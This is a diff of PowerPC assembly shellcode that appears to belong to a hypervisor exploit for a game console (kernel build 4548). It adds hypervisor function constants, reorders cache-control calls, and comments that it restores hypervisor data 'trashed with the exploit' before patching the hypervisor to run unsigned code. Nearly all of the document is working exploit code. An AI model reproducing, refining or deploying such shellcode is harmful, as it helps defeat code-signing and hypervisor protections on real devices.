@@ -8,6 +8,11 @@
 .set	OriginalStackPointer,			0x7004F2F0	# Stack pointer value upon exiting the load park function
 
 ###########################################################
+# Hypervisor constants for 4548
+.set	HvpSetRMCI,						0x00000B64
+.set	HvpRelocateCacheLines,			0x000014B8
+
+###########################################################
 # Kernel constants for 4548
 .set    MmAllocatePhysicalMemoryEx,     0x8007CC18
 .set    MmGetPhysicalAddress,           0x8007C9F8
@@ -888,7 +893,7 @@ _shell_code_start:
         stb     %r11, 0(%r1)
         li      %r11, 0xFF          # LED override
         stb     %r11, 1(%r1)
-        li      %r11, 0xFF          # color = orange?
+        li      %r11, 0xFF          # color = orange
         stb     %r11, 2(%r1)
         
         # Send the command to the SMC.
@@ -898,21 +903,22 @@ _shell_code_start:
         mtctr   %r11
         bctrl
 		
-		# Disable RMCI.
-		li		%r3, 0
-		li		%r11, 0xB64
-		mtctr	%r11
-		bctrl
-		
-		# Fix the hv data we trashed with the exploit.
+		# Fix the hv data we trashed with the exploit. Note we don't need to enable caching because
+		# we're writing data and HvpRelocateCacheLines will clear the entire cache line anyway.
 		li		%r5, 1
 		ld		%r29, (hv_restore_data_address - _shell_code_start)(%r31)
 		mr		%r4, %r29													# dst = start of cache line we overwrote
 		addi	%r3, %r31, (hv_restore_data - _shell_code_start)			# src = restore data address
-		li		%r11, 0x14B8
+		li		%r11, HvpRelocateCacheLines
 		mtctr	%r11
 		bctrl
-		icbi	0, %r29
+		
+		# Disable RMCI (enable caching). This is required to modify executable memory without having
+		# to clear the entire cache line.
+		li		%r3, 0
+		li		%r11, HvpSetRMCI
+		mtctr	%r11
+		bctrl
 		
 		# Apply patches to the hypervisor so we can run unsigned code.
 		lis		%r4, 0x3860
@@ -931,9 +937,9 @@ _shell_code_start:
 		andc	%r3, %r3, %r5
 		icbi	0, %r3
 		
-		# Enable RMCI.
+		# Enable RMCI (disable caching).
 		li		%r3, 1
-		li		%r11, 0xB64
+		li		%r11, HvpSetRMCI
 		mtctr	%r11
 		bctrl
         
